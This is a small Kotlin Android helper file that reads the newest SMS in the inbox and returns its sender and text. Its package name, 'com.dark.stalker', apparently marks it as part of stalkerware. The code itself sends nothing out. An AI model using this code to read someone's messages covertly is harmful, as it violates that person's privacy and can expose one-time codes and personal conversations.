package com.dark.stalker

import android.content.ContentResolver
import android.content.Context
import android.provider.Telephony

object SmsUtils {
    fun getLatestSms(context: Context): String {
        val uri = Telephony.Sms.Inbox.CONTENT_URI
        val cr: ContentResolver = context.contentResolver
        val cursor = cr.query(uri, null, null, null, "date DESC limit 1")
        
        if (cursor != null && cursor.moveToFirst()) {
            val address = cursor.getString(cursor.getColumnIndexOrThrow("address"))
            val body = cursor.getString(cursor.getColumnIndexOrThrow("body"))
            cursor.close()
            return "SMS from $address: $body"
        }
        cursor?.close()
        return "No Recent SMS"
    }
}
